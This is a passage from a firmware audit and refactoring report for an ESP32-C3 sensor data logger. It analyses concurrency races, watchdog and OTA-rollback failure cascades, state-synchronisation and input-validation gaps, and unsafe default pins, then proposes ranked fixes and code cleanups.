**FB.1 (M) — LittleFS flash erase (10-50 ms/sector) suspends non-IRAM code.** All registered ISRs (`onFlowPulse`, `WaterFlowSensor::_isr`, `RainSensor::_isr`, `WindSensor::_isr`) are correctly `IRAM_ATTR` — they fire during erase. BUT the I2C / 1-Wire bit-banging paths (Wire.cpp, DS18B20_Mini timing, DS1302 ThreeWire timing) are NOT in IRAM. During flash erase, a SensorTask mid-read sees micro-stalls of 10-50 ms. Combined with 17.11 (1-Wire reads without `noInterrupts()`) and 17.13 (DS1302 ThreeWire without mutex), a sustained CSV-write storm produces flaky temperature readings whenever the FS happens to be erasing.

**FB.2 (M) — pulseCount ↔ legacy state machine race window.** `onFlowPulse` ISR increments `pulseCount` (single 32-bit aligned write — atomic on RV32). Main loop reads via `noInterrupts() / interrupts()` guard (ESP_Logger.ino:917-920). Window: between L920 `interrupts()` and L922 use, a pulse can arrive and increment past the snapshot. The captured `currentPulses` is correct, but the new pulse is now in `pulseCount` AND ALSO will be counted in the NEXT cycle (since pulseCount = 0 was the capture-clear). Result: occasional under-counted cycles. Mitigated by very short window; flagged as systemic atomicity gap.

**FB.3 (M) — ISR-installed handlers + reloadConfig dangling-`this`.** SensorManager.reloadConfig calls `_destroyAll` → `delete sensors[i]` → frees the object. WaterFlow/Rain/Wind ISRs were installed via `gpio_isr_handler_add(pin, _isr, this)`; the `this` pointer is now dangling. Next pulse fires the IRAM ISR with corrupted memory → SIGSEGV at IRAM. Already individually flagged (2.6, 23.2-23.3) but combined effect: ANY runtime config reload from the web UI with ISR-driven sensors enabled = guaranteed crash on next pulse.

**FB.4 (L) — ISR_DEBOUNCE_MICROS = 1000 vs runtime-configurable isrDebounceUs.** Two separate debounce constants for what should be one configurable value (Phase 1 #1.18 + Phase 2 #2.13). Buttons use polling-debounce (no ISR), flow uses 1ms hardcoded — so neither code path ever reads the runtime `isrDebounceUs`. Dead variable that misleads future maintainers into thinking debounce is web-configurable.

### C — Perfect Storm Cascade Trace

Scenario: simultaneously (a) WiFi drops mid-batch, (b) LittleFS reaches 100% full, (c) flow sensor still pulsing at 5 Hz.

**T+0 — Trigger:**
- WiFi.status() → WL_DISCONNECTED. ExportTask's `_sendWithRetry` first call returns false.
- StorageTask is mid-`primary.appendRow` holding `fsMutex` (portMAX_DELAY).
- Sensor ISR keeps incrementing `pulseCount` / `_pulses`.

**T+1s to T+35s — Exporter blocking + queue saturation:**
- ExportTask retry chain: delay(5000) + delay(10000) + delay(20000) = 35 s of `vTaskDelay` (18.1).
- ExportTask heartbeat NOT refreshed (11.8); after 30 s, C4 watchdog (`MAX_SILENCE_MS=30000`) detects stale heartbeat → sets `shouldRestart = true`.
- During the 35 s window:
  - ProcessingTask consumes from `sensorQueue`, tries to forward to `exportQueue` with timeout=0 → silent drops once queue depth (32) saturates (2.9). `g_queueDrops` increments but the counter is `volatile uint32_t`-not-atomic (2.10) so increments race.
  - ProcessingTask forwards to `storageQueue` with timeout=50ms → eventually drops once StorageTask falls behind (StorageTask is busy mid-`appendRow` on a now-full FS).

**T+30s — C4 watchdog triggers restart:**
- `loop()` sees `shouldRestart=true`. Calls `OtaManager::confirm()` (ESP_Logger.ino:783).
- **FC.1 (CRITICAL) — Inadvertent OTA confirmation of a broken image.** If the running firmware was in PENDING_VERIFY state (just OTA'd) and triggered the watchdog due to a crash bug, `OtaManager::confirm()` at L783 marks the broken image VALID before reboot. The rollback watchdog window (90 s) effectively never fires because the watchdog reset path always confirms. **A crash-bug that takes >30 s to trigger but <90 s gets PERMANENTLY confirmed instead of rolled back.**
- After confirm: `safeWiFiShutdown()` → `delay(100)` → `ESP.restart()`.

**T+33s — Cold reboot:**
- Reset reason = `ESP_RST_TASK_WDT`. _writeResetLog (ESP_Logger.ino:302) tries `activeFS->open("/reset_log.txt", FILE_APPEND)` → succeeds-but-write-returns-0 (FS full). Boot loop diagnostic lost forever.
- `loadConfig` reads `/config.bin` (exists, succeeds).
- `migrateConfig` end-of-function calls `saveConfig()` (ConfigManager.cpp:352). saveConfig opens `/config.tmp` → write returns 0 → rename fails. `config.version` is updated in RAM but the on-disk file stays at old version. **FC.2 (H) — infinite migration on every boot when FS full.**
- `_initPlatform` registers sensors, calls `TaskManager::init`. JSON parse of `/platform_config.json` succeeds (file still readable). Tasks spawn. SCD4xSensor.init blocks 5.1 s (22.1).
- `OtaManager::boot()` runs AFTER initHardware/initRtc (ESP_Logger.ino:543, see also 1.14 / 8.10): if previous firmware was PENDING_VERIFY, it RE-arms the 90 s deadline. `tick()` will confirm again at T+33+90 = T+123 s if the watchdog doesn't fire first. So:
  - With Arduino IDE bootloader (no `CONFIG_BOOTLOADER_APP_ROLLBACK_ENABLE`), the OTA state stays `PENDING_VERIFY` across watchdog resets. Each boot re-arms 90 s. **The image never actually rolls back via the bootloader.** OtaManager.cpp:57-60 documents this but the audit-log comments imply rollback works — design/doc mismatch (already 9.14).
- AlertEngine.begin reads `/alerts.json`. **FC.3 (H) — alerts.json may have been truncated to 0 bytes by a non-atomic save during the previous cycle (15.9).** Parse error → returns false → alertEngine has 0 rules. User's alert configuration silently lost.
- saveConfig() inside migrateConfig fails silently. Boot completes with stale config.version.

**T+33s onwards — Steady-state failure:**
- All the conditions persist: WiFi still disconnected, FS still full, ISR still pulsing.
- ExportTask retries again. C4 fires again at T+63 s. shouldRestart=true. Reboot.
- **FC.4 (CRITICAL) — Restart loop with no progress.** No retry-counter, no exponential boot-time backoff. Boot every ~33 s indefinitely. Each cycle: 5.1 s SCD4xSensor delay, plus other init overhead, plus the cascading failures.
- Each boot increments `bootCount` (via `backupBootCount` which writes to `/bootcount.bin` non-atomically — 8.6). Eventually `/bootcount.bin` corrupts; next `restoreBootCount` reads partial bytes into bootCount (8.7) → unbounded values.
- After enough cycles, LittleFS wear-leveling consumes the same physical sectors → bricks the flash.

**FC.5 (H) — No circuit breaker.** Every "shouldRestart=true" path leads back through `loop()`. There is no:
- Backoff timer ("wait 5 minutes before next restart if last 3 resets were within 30 s")
- Safe-mode boot ("if reset_reason == TASK_WDT 5× consecutive, skip TaskManager::init and serve only the failsafe UI")
- Manual recovery beacon ("after N failed boots, AP up with default password regardless of config")

The shipped device, once in this cascade, requires USB recovery — which a remote deployment cannot perform.

### D — State-Synchronisation Risks (Multiple Sources of Truth)

**FD.1 (H) — 7 distinct storage locations for device state, no documented precedence:**

| Source | Contents | Authority |
|---|---|---|
| `/config.bin` | DeviceConfig binary | Asserted authoritative (saveConfig comment) |
| `/config/modules.json` | Module IModule slices | "Shadow" of /config.bin per Pass 5 |
| `/platform_config.json` | Sensor + exporter config | Authoritative for sensor pipeline |
| `/alerts.json` | AlertEngine rules + history | Authoritative for alerts |
| ESP32 NVS | WiFi creds (via `WiFi.persistent=true`) | Independent — SerialProvisioner 14.7 |
| DS1302 SRAM | bootCount (5 bytes) | Authoritative on warm boot |
| `/bootcount.bin` | bootCount backup | Fallback when DS1302 magic invalid |

No code enforces the asserted precedence. A user uploading `/config/modules.json` directly via `/upload` gets silently overwritten on next saveConfig (13.10). A serial-provisioned WiFi connection (14.8) doesn't update `/config.bin` → `/export_settings` shows stale creds. **The system has no "single source of truth"; every restart is a state-merging gamble.**

**FD.2 (M) — No WiFi-state coordinator.** Five mutating sites (connectToWiFi legacy, startAPMode legacy, wifiTestTaskFn web 3.11, _cmdConnect serial 14.10, safeWiFiShutdown) plus NVS persistence — all can change `WiFi.mode()` / `WiFi.status()` concurrently. No central state machine, no "wifiBusy" flag. Concurrent ops are race-prone.

**FD.3 (M) — No time-source coordinator.** Each task picks its own epoch from `Rtc->GetDateTime() / time(nullptr) / millis()/1000`. After an NTP correction, in-flight readings tagged with the old timestamp arrive at LiveAggregator which already advanced `_lastFlushEpoch` to the new epoch → 12.7 cascade. The same epoch-jump scenario invalidates SensorHealth bucket rotation (SensorManager.cpp:142-153 advances `slotStartMs += ONE_HOUR_MS`; an epoch backward-jump would temporarily peg curSlot until clock recovers).

### E — Validation / Data-Flow Cross-Boundary Failures

**FE.1 (H) — Every user-controlled string crosses 4-6 module boundaries with ZERO validation/escape boundary.**

Trace: theme color field
1. POST `/save_theme` (WebServer.cpp:1142) → SAFE_STRNCPY into `config.theme.primaryColor[8]` — no hex validation.
2. saveConfig → `/config.bin` (binary).
3. Subsequent boot → loadConfig reads binary → no validation on load.
4. /export_settings → JSON `o["primaryColor"] = config.theme.primaryColor` — raw pointer.
5. settings.js renders into `<input type="color">` (frontend validates hex but read path bypasses).
6. /api/status → SPA injects into `#themeVars` `<style>` via JS — CSS injection vector if value contains `;}` (27.5).

Same pattern: chartLocalPath (26.3) → `<script src=>`; sensorId (5.17) → JSON exports; webhook URL (18.9) → HTTPS request; OSM access_token (19.14) → Authorization header. **The codebase has no validation taxonomy.** Each new field adds a new attack-surface line.

**FE.2 (H) — IModule contract `bool load(JsonObjectConst)` is dead.** Every implementation returns true unconditionally (13.2 / 14.1). Even if a module rejected the payload, `ModuleRegistry.cpp:78` discards the return (6.12). Validation cannot be added retrofitting one site — both ends are broken.

### F — Failure-Mode Coverage Gaps

**FF.1 (M) — _writeResetLog can't function when FS full.** The diagnostic path that would tell an operator "boot loop in progress" is the FIRST casualty of full-FS. Combined with no remote telemetry (LittleFS log is local-only), a deployed unit stuck in restart loop is invisible to ops.

**FF.2 (M) — Watchdog reset doesn't cancel pending OTA verify.** FC.1 expansion: the OTA pending-verify window is supposed to detect "image crashes the device". But on Arduino IDE bootloader, every watchdog reset RESTORES `PENDING_VERIFY` instead of marking the image invalid. The 90 s `tick()` deadline auto-confirms after one quiet boot — which any image can achieve by simply not crashing in the first 90 s, even if it crashes every 91 s afterward.

**FF.3 (M) — Heartbeat starvation paths are everywhere.** 11.6 (StorageTask drain loop), 11.8 (ExportTask sendAll), 17.5 (BME280 infinite wait), 22.1 (SCD4x 5.1 s init), 24.1 / 24.6 (HC-SR04 / ZMPT / ZMCT blocking SensorTask), 14.9 (SerialProvisioner blocking scan), 17.13 (DS1302 unsynchronised reads). 30 s C4 threshold is too tight given the documented operations that legitimately approach or exceed it.

**FF.4 (H) — No graceful-shutdown contract.** TaskManager::shutdown is 3 s drain + 500 ms hard wait. AsyncTCP, AsyncEventSource, MqttExporter, HTTPClient (TLS), and FS-writes all have longer worst-case completion windows. `ESP.restart()` is fire-and-forget at the OS level — any in-flight TLS session dies ungracefully, MQTT clients see unclean disconnect (LWT fires even on user-initiated reboot), brokers/subscribers receive misleading "offline" state.

### G — Hardware Defaults Compound Software Risks

**FG.1 (H) — Default pin assignments in `platform_config.json` and `Config.h::DefaultPins` are systematically wrong on the supported hardware:**

| Pin | Default Use | Reality on ESP32-C3 SuperMini |
|---|---|---|
| GPIO0 | ZMPT101B ADC (24.8) | Strap pin (boot mode select) |
| GPIO1 | ZMCT103C ADC (31.3) | UART0 TX |
| GPIO2 | DS18B20 1-Wire (31.2) | Strap pin |
| GPIO3 | SoilMoisture ADC (31.2) | Strap pin |
| GPIO8 | WindSensor pulse (31.2) | Strap pin |
| GPIO9 | RainSensor pulse (31.1) | Strap pin (CRITICAL soft-brick) |
| GPIO10-13 | SD SPI (5.8) | SPI flash bus on C3 |
| GPIO18-19 | EarlyGPIO snapshot includes (1.2) | USB D+/D- |
| GPIO21 | Flow sensor default (5.7) | USB D+ on SuperMini |

A user who picks any default-configured sensor and enables it inherits a hardware-induced failure. Combined with FE.2 (validation contract dead), the firmware cannot refuse the invalid config.

**FG.2 (M) — `sanitizeWakeConfig` (ConfigManager.cpp) only validates RTC wake pins and a few SD pins. It does NOT touch the sensor plugin pins read from `platform_config.json`.** Pin conflict detection lives only in `_checkPinConflicts` (ESP_Logger.ino:324) which warns about flow-sensor pin collisions only — not strap pins, not USB pins, not SPI flash pins.

### H — Performance Death Spirals

**FH.1 (M) — Datalog growth slows every flush.** `countFileLines` (9.7) re-scans the entire log byte-by-byte before every append. A 1 MB log file means 1 MB sequential read per flush. Combined with `trimLogFile` (9.8) which copy-moves every retained byte after trimming, each flush of a near-full log can stall the calling task for seconds.

**FH.2 (M) — Spool drain duplicate-send amplifier.** `_drainSpool` (18.2) on partial-batch failure preserves the spool file but does NOT remove already-sent batches → next drain re-sends them. For a non-idempotent exporter (HTTP POST with side-effects), one transient network glitch produces exponential duplicate uploads.

**FH.3 (L) — innerHTML reflow per-navigation.** Each SPA page navigation rebuilds large `innerHTML` strings (26.9). Reflow cost scales with sensor count. On devices with many configured sensors, the UI becomes visibly sluggish after a few minutes of polling.

### I — Top Systemic Remediations (Ranked by Reachability vs Severity)

1. **Add a restart-circuit-breaker** (FC.4): track `consecutiveResets` in RTC RAM; after 3 within 60 s, enter safe-mode (AP-only, no sensor pipeline, serve failsafe UI). Single ~30-line patch in ESP_Logger.ino:setup.
2. **Move `OtaManager::confirm()` out of the shouldRestart path** (FC.1): only confirm after a successful uptime threshold, NOT on every restart. Crashes-then-restarts must NOT confirm broken images.
3. **Make all fsMutex acquirers consistent** (FA.1): every LittleFS write call site acquires the mutex with bounded timeout (2 s) and bails on timeout. Removes the "mutex theatre" — either the protection holds or the bypass goes silent.
4. **Centralise hardware-default sanity** (FG.1, FG.2): add a `validateAllPinsForTarget()` at boot that scans every plugin's configured pin against per-target strap/UART/USB/flash lookups. Refuse to enable any sensor with a hardware-incompatible pin; log clearly.
5. **Implement a state-version contract for IModule.load()** (FE.2): change the signature to `enum class LoadResult { Ok, ValidationFailed, NoChange }` and force ModuleRegistry to honour the return. Sites where load() currently returns `true` unconditionally compile-fail with the new type.
6. **Single time-source service** (FD.3): one `epoch_now()` function used by every task; backward-jump detection + flush of dependent state.
7. **Reset-log rotation** (FF.1): cap `/reset_log.txt` at 8 KB with .bak rotation so full-FS doesn't kill the diagnostic surface.
8. **Document the storage-precedence model** (FD.1): even without code changes, a single INSTRUCTIONS.md table mapping "this field lives in source X, shadowed in source Y" prevents the user-edit-overwritten silent-loss class of bugs (13.10).

[END OF AUDIT — Final Phase]

---

## REFACTORING & OPTIMIZATION OPPORTUNITIES

Switched from "Auditor" to "Senior Refactoring Engineer". Structural improvements grouped by category. NO code changes yet — these are candidates for a follow-up cleanup pass.

### R1. Dead Code Elimination

- **`src/sensors/plugins/YFS201Sensor.h`** — header for a class with NO `.cpp` implementation; `ESP_Logger.ino:387-388` registers `"yfs201"` via the `WaterFlowSensor` factory lambda instead. Orphan file → **delete**.
- **`src/storage/HybridStorage.*`** — entire module never referenced from anywhere (verified via grep). `begin()`/`primary()`/`secondary()`/`mirrorWrite()` all dead. Mirror logic actually lives in TaskManager.cpp. **Delete both files** (~2-3 KB flash reclaimed).
- **`HardwareManager.cpp:8-22`** `onFFButton`/`onPFButton` IRAM ISRs declared with `IRAM_ATTR` but never registered via `attachInterrupt` anywhere. Holds IRAM forever for no reason. Plus `volatile bool ffPressed/pfPressed` globals (Globals.h:78-79) and `lastFFInterrupt/lastPFInterrupt` are also write-only.
- **`StorageManager.cpp:91-123` `generateDatalogFileOptions`** + **`L126-153 countDatalogFiles`** + **`L85-89 getStorageBarColor`** — all declared/defined, **zero callers** (verified). Plus 8.2's HTML-injection risk if revived. Delete from `.h` and `.cpp`.
- **`HardwareManager.cpp:56-60`** `isPinSafe` lambda defined inside `initHardware()` but never invoked. Dead-defensive code.
- **`ESP_Logger.ino:485`** `isrDebounceUs = config.hardware.debounceMs * 1000UL;` — assigns a value only read by ISRs that are never attached (above). Dead assignment + dead global at Globals.cpp:75.
- **`src/arduino_build_flags.h`** — deprecated 28-line shim that just `#include "setup.h"`. Comment says "kept only so older sketches still compile". If no current code in the tree includes it directly, delete with a release-note breaking-change.
- **`IModule.h:54`** `virtual void tick(uint32_t nowMs) {}` — never called from any caller. Either wire it into the main loop or delete the virtual.
- **`ModuleRegistry.cpp:130-138 startAll()`** — function defined but never called from `setup()` (6.11). Either invoke it or delete.
- **`Config.h:232`** `uint8_t _reserved_lang;` — explicitly named "reserved", permanently burned byte. Repurpose as a feature-flag byte or document.
- **`setup.h:114-122`** `DEFAULT_SDA` / `DEFAULT_SCL` / `DEFAULT_FLOW_PIN` macros — declared but never referenced in src/ (5.1). Plus disagree with Config.h DefaultPins (FG.1). Delete.
- **`setup.h:222`** `TEST_MODE_BLINK_MS` macro — defined but `config.flowMeter.blinkDuration` is used everywhere instead.
- **`OtaModule.cpp:5-8`** `load(JsonObjectConst /*cfg*/) { return true; }` — empty body, IModule contract minimum. Acceptable but worth wrapping in a `class StatelessModule : public IModule` base to eliminate the boilerplate.
- **`SDS011Sensor.cpp:37`** `uint8_t cmd[19] = {0xAA, 0xB4, 0x08, 0x01, (uint8_t)work, 0,0,0,0,0,0,0,0,0,0, 0xFF, 0xFF, 0, 0xAB};` — element at index 17 set to `0` then OVERWRITTEN at L40 with checksum. Dead initializer value.
- **`AlertEngine::hasToasts() const`** declared in .h (AlertEngine.h:62), exposed but never called from src/ (verified). Hoist to private or delete.
- **All `#ifdef SENSOR_*_ENABLED` blocks** in ESP_Logger.ino:73-126 + 355-411 + setup.h:36-89. With most sensors commented out in setup.h, the `#ifdef` blocks correctly DCE the code, but the registration lambdas at L355-411 add ~20 lines of preprocessor noise. Consider a `static SensorRegistration<XSensor> r("x");` self-registration pattern.

### R2. DRY Violations (Duplicated Logic)

- **`nowEpochSafe()` duplicated 3× verbatim** — SensorTask.cpp:17-28, SlowSensorTask.cpp:14-25, StorageTask.cpp:17-25. **Plus inline equivalents** at WebServer.cpp:611-613, ApiHandlers.cpp:44. **5 copies of "RTC → NTP → millis fallback" logic.** Extract to `pipeline/TimeSource.h::uint32_t epochNow();`. Eliminates the FD.3 systemic risk while reducing flash by ~200 bytes.
- **`Lock` RAII helper duplicated** in LiveAggregator.cpp:11-23 AND FlowRunLogger.cpp:6-16 (identical class). Extract to `pipeline/MutexGuard.h`.
- **`copyStr(char* dst, size_t n, const char* src)` helper** in DataLogModule.cpp:7-9 AND ThemeModule.cpp:7-9. Duplicate; extract to `utils/StringUtils.h`.
- **`SAFE_STRCPY` macro at ConfigManager.cpp:12 vs `SAFE_STRNCPY` at WebServer.cpp:45** — same underlying pattern (strncpy + explicit NUL termination) but DIFFERENT signatures: SAFE_STRCPY takes 2 args and relies on `sizeof(dst)` (stack-array only); SAFE_STRNCPY takes an explicit `n` (works on pointers / member fields without sizeof). Cannot simply consolidate into one macro. Better remediation: a `template<size_t N> void safeCopy(char (&dst)[N], const char* src);` that subsumes the sizeof variant via deduction, OR a `safeCopyN(char* dst, const char* src, size_t n);` free function — caller picks based on whether they have a known-size array.
- **I2C `_writeReg / _readReg / _readBlock` helper trio** is privately implemented in BME280_Mini.h, BME688_Mini.h, ENS160Sensor.cpp, VEML6075Sensor.cpp, VEML7700Sensor.cpp, BH1750Sensor.cpp, SCD4xSensor.cpp, SGP30Sensor.cpp — **8 copies**. Extract a shared `I2cBus` helper class. Also reduces footgun count for 22.x I2C-error handling (each duplicate gets to ignore endTransmission return value independently).
- **Sensirion CRC-8 (poly 0x31, init 0xFF)** implemented twice: SGP30Sensor.cpp:4-11 + SCD4xSensor.cpp:4-12. Centralise in `utils/SensirionCrc.h`.
- **`Wire.begin(sda, scl) if (sda>=0 && scl>=0) else Wire.begin()`** pattern duplicated in **8 sensor plugins** (BME280, BME688, ENS160, SCD4x, SGP30, VEML6075, VEML7700, BH1750). Already creates the 20.1 race. Extract a single `bus::setupI2C(sda, scl)` that's idempotent + thread-safe.
- **`gpio_isr_handler_add` + `static bool _isrServiceInstalled` + destructor cleanup** triple (which 3 plugins each implement and 2 forget — see 2.6 / 23.2-23.3). Extract `IsrPin` RAII class that handles install AND removal in dtor.
- **"Open + 16 KB size cap + JsonDocument parse" pattern** in ModuleRegistry.cpp:46-64, ExportManager.cpp:16-35, SensorManager.cpp:41-58, HybridStorage.cpp:15-27 (dead), ApiHandlers.cpp:855-868, ESP_Logger.ino:264-275 / 329-330. **6 near-identical sites**. Extract `bool loadJsonFile(fs::FS&, const char* path, JsonDocument& doc, size_t maxBytes = 16384);`.
- **Atomic-write-via-tmp+rename pattern**: ConfigManager.cpp (config.bin) and ModuleRegistry.cpp (modules.json) implement it. AlertEngine._save (15.9), DataLogger.flush (9.8 trimLogFile), FlowRunLogger._closeRun (12.11), CsvLogger._rotate (16.1), backupBootCount (8.6) all DO NOT. Extract `bool atomicWrite(fs::FS&, const char* path, std::function<bool(File&)> writerFn);`. Single utility prevents the systemic non-atomic class of bugs.
- **IPv4 "A.B.C.D" parser** in WiFiModule.cpp:8-16 AND WebServer.cpp:1251-1258 (`parseIP` lambda). Extract `bool parseIPv4(const char* s, uint8_t out[4]);`.
- **Timestamp priority logic** (`RTC valid → NTP → millis`) — see TimeSource refactor above.
- **`AsyncResponseStream + serializeJson + req->send(resp)` boilerplate** appears 20+ times in ApiHandlers.cpp and WebServer.cpp. The `sendJsonResponse(req, doc)` helper at WebServer.cpp:62 already exists but most callers don't use it. **Audit + migrate all 20+ sites** to one helper. → **Fixed (#84)** — helper moved to `src/utils/JsonResponse.h`; 12 qualifying sites in ApiHandlers.cpp migrated; 3 sites with custom headers/streaming excluded per Gate 2.
- **`if (rateLimit429(r)) return; if (csrfBlock(r)) return;` doubled guard** at the top of every mutating handler (~12 sites). Wrap in a single `if (!requireMutatingAuth(r)) return;` helper. Forces consistent ordering, prevents the 3.x family of "added rateLimit but forgot CSRF" bugs.
- **`req->hasParam("X", true)` + `req->getParam("X", true)->value().toInt()/.toFloat()/.c_str()`** triple is repeated 60+ times across /save_hardware, /save_datalog, /save_network. Extract `getIntParam(r, "X", default)`, `getFloatParam`, `getStringParam`. Halves the line count of save handlers.
- **`(EnumType)(cfg["x"] | (int)current)` cast** appears in every IModule.load() (WiFi/Theme/DataLog/Time). Plus 13.3 / 13.9 / 14.2 / 14.3 / 14.6 flagged the missing range checks. Extract `template<typename E> bool loadEnum(JsonObjectConst, const char* key, E& out, int min, int max);`.
- **`new T[N]` without `std::nothrow`** at ApiHandlers.cpp:236, HttpExporter.cpp:34, OpenSenseMapExporter.cpp:45, AggregationEngine.cpp:210. Extract `template<typename T> T* allocOr500(size_t n, AsyncWebServerRequest* r);`.
- **Default theme colour SAFE_STRCPY chains** in ConfigManager.cpp:213-232 (`loadDefaultConfig`) AND 96-112 (`applyDefaults`). Two near-identical chains × 14 fields. Define a PROGMEM table `static const struct { size_t offset; const char* defaultValue; } themeDefaults[] = { ... };` walked by one function.
- **Sensor plugin factory boilerplate** in ESP_Logger.ino:355-411 — 19 sensor types × identical `sensorManager.registerPlugin("X", []()->ISensor*{ return new XSensor(); });`. Replace with a macro `REGISTER_SENSOR(type, Class)` or self-registration via a global ctor (uses static-init order — needs care).

### R3. Memory / Flash Optimization

- **`SensorReading` is ~72 B** with implicit compiler alignment (no `#pragma pack`). Three FreeRTOS queues + ring buffer = 6.2 KB + 14.4 KB queue/RAM cost. Plus /api/data path allocates `SensorReading[300]` twice (~44 KB transient). **Could shrink by removing the redundant `sensorType[12]` field** (always derivable from sensorId via SensorManager lookup) — saves 16 B/reading → ~5 KB across queues + ring buffer.
- **`#pragma pack(push, 1)` on DeviceConfig in Config.h** is good for on-disk size but forces unaligned float access on RV32 (5.10). Remove the pack and bump CONFIG_VERSION; trade 30 B extra disk for cycle savings on every config read.
- **PROGMEM under-utilization**:
  - `SDS011Sensor.cpp:37` `cmd[19]` config command — should be `static const uint8_t cmd[] PROGMEM` + `memcpy_P`.
  - `BME688_Mini.h:250-261` `lookupK1[]` / `lookupK2[]` const arrays are NOT `PROGMEM` → consume DRAM. ~256 B reclaimable.
  - `Sensor::getMetrics` returns `static const char* m[] = { ... }` in every plugin — already in .rodata (good).
- **ConfigManager.cpp duplicated string literals**: every theme color hex `"#275673"` etc. appears at L213 + L98 = two copies in flash. ~14 colors × ~8 chars = 112 B reclaimable.
- **StorageTask stack allocation** `char headerBuf[1024] + char rowBuf[1024]` = 2 KB on STACK_STORAGE_TASK=8192 (25% of budget). Make member fields of `class StorageTask` so the buffers move to BSS and the stack frees up for other callees.
- **ZMPT/ZMCT `alloca(sizeof(int)*500) = 2000 B`** on SensorTask stack 4096 (24.7). Pre-allocate as a class member.
- **`String getRtcTimeString() / getRtcDateTimeString()`** return Arduino String → heap alloc per call. Called from JSON serialisation in hot paths. Change to `void getRtcTimeStr(char* out, size_t n);`. ~12 B/call savings × frequent.
- **`Globals.h:50-52`** `extern String wakeUpButtonStr / cycleStartedBy` — Arduino String members with heap-allocated internal buffers, mutated cross-task (6.3). Convert to `char[16]` arrays.
- **`Arduino String` use in `Utils.cpp`** (sanitizePath/sanitizeFilename, urlEncode, deleteRecursive's vector<String>) — every call allocates short-lived strings. Convert to `std::string_view` or caller-supplied buffers in hot paths.
- **`std::vector<Pending> stack` in `deleteRecursive` (Utils.cpp:85)** + `std::vector<String> dirs` in `StorageManager.cpp:97, 130` — vectors of `String` (or structs containing `String`) are heap-on-heap allocations. Could use a fixed-size stack array with depth cap (also addresses 7.4 OOM risk).
- **`std::unique_ptr<char[]>` allocation in WebServer.cpp:755-756** (`lastLines`, `lineBuf`) — pattern is good (already heap-aware) but could be a single combined buffer to halve allocation calls.
- **`Slot slots[16]` in SensorManager.toJson:248** — ~60 B × 16 = 960 B stack. Acceptable but member-field promotion would let the slot array survive across calls and avoid re-allocation.
- **`AlertToast _toasts[8]` ring buffer** is 80 B × 8 = 640 B BSS per AlertEngine instance. OK.
- **Each sensor plugin's `static const char* m[] = { ... }` in getMetrics** is fine (.rodata), but a single consolidated `enum Metric` table indexed by uint8_t would let `SensorReading::metric` shrink from `char[16]` to `uint8_t` (-15 B/reading × queues = ~3 KB).

### R4. Include Cleanup

- **`Globals.h` pulls heavy headers**: `<LittleFS.h>`, `<FS.h>`, `<SD.h>`, `<ESPAsyncWebServer.h>`, `<drivers/DS1302_Mini.h>`. Every TU paying for these. Most callers don't need `<SD.h>` or `<ESPAsyncWebServer.h>`. Split into:
  - `Globals.h` — bare-minimum extern declarations
  - `GlobalsWeb.h` — pulls AsyncWebServer for handlers
  - `GlobalsStorage.h` — pulls LittleFS/SD for storage code
- **`ApiHandlers.h`** declares one function (`registerApiRoutes(AsyncWebServer&)`) but includes `<ESPAsyncWebServer.h>`. Forward-declare `class AsyncWebServer;` instead — caller already includes the full header.
- **`WebServer.h`** includes `<ESPAsyncWebServer.h>`, `<ArduinoJson.h>`, `<functional>`. Forward-declare `class AsyncWebServerRequest;` and `class JsonDocument;` (the latter is harder in ArduinoJson v7 but doable via the public alias).
- **`TaskManager.h:5`** `#include <FS.h>` — only `init(fs::FS&)` needs it. Forward-declare `namespace fs { class FS; }`.
- **Sensor plugin headers**: Each `*Sensor.h` includes `<Wire.h>` because of `TwoWire* _wire` member. Move the include to `*Sensor.cpp` and forward-declare in the header (TwoWire is a class — easy forward decl).
- **`HttpExporter.h`** includes `<HTTPClient.h>` but only the .cpp uses `HTTPClient http;`. Move include to .cpp.
- **`WebhookExporter.h` / `SensorCommunityExporter.h` / `OpenSenseMapExporter.h`** all include `<HTTPClient.h>` in the header for the same reason. Same fix.
- **`MqttExporter.h`** includes `<WiFiClient.h>` and `MQTT_Mini.h` — both are member types so the include is mandatory. OK.
- **`ESP_Logger.ino`** includes ~30 headers individually. Build flag `SENSOR_X_ENABLED` gating is correct, but the long include list duplicates the registration list at L355-411. A single `sensors/all.h` aggregator (also build-flag-gated) would reduce churn.
- **No circular includes detected** via grep. Good baseline.

### R5. Other Structural Improvements

- **`CsrfToken` and `RateLimiter` are static-method classes** with module-globals. Convert to free functions in a `csrf::` / `ratelimit::` namespace; cleaner intent, no class boilerplate.
- **`Handlers` event-dispatcher map in core.js** has 30+ registrations spread across 4 files. Adopt a single `registerHandlers({...})` call at the end of each file (some files already do this). Document the security invariant (25.4) directly above each registration block.
- **Settings pages are 80% boilerplate HTML** (page-head, form, cards, save button). Server-side could generate them from a single template + per-page metadata. Or use the schema-driven Modules pattern (currently only powers settings_modules.html) for the rest, retiring the legacy per-page HTML.
- **`#if PLATFORM_LEGACY_BUILD`** wraps DataLogger.cpp entirely (good pattern). Could expand to wrap the legacy state-machine in ESP_Logger.ino (~150 lines) the same way — saves flash on non-legacy builds.
- **`saveConfig()` + `moduleRegistry.saveAll()` are called as a pair** in ~5 sites (1.9 / 6.15). Combine into a single `persistConfig()` that locks once and writes both.
- **The 6 default-pin tables** (DefaultPins, _checkPinConflicts, sanitizeWakeConfig, isPinSafe, platform_config.json, the various plugin defaults) should consolidate into a single per-target pin map (cpp const struct) consulted by all validation paths. Centralises FG.1 / FG.2 fixes.
- **Default `platform_config.json` ships in /www/** but should logically live in /src/defaults/ as a `const char* PROGMEM` and be written to LittleFS only if absent at boot.

### Estimated Impact

| Category | Files / Lines Reduced | Flash | DRAM | Notes |
|---|---|---|---|---|
| R1 (dead code) | ~12 files, ~600 LOC | ~5-8 KB | ~1 KB | Quick wins; no behavior change |
| R2 (DRY) | ~20 sites consolidated | ~3-5 KB | — | Improves maintainability + fixes systemic bugs (atomicWrite eliminates 9.8/12.11/15.9/16.1 family) |
| R3 (memory) | — | ~2 KB | ~10-15 KB | Significant heap headroom; enables more concurrent web sessions |
| R4 (includes) | — | — | — | Faster compile, cleaner public surface |
| R5 (structural) | — | ~2-4 KB | — | Reduces boilerplate; eases future feature additions |

**Highest-leverage refactor: `atomicWrite()` extraction (R2).** Single helper retroactively fixes 5+ flagged bugs (8.6, 9.8, 12.11, 15.9, 16.1) and prevents the entire "non-atomic FS write" class going forward.

[END OF REFACTORING PHASE]

---

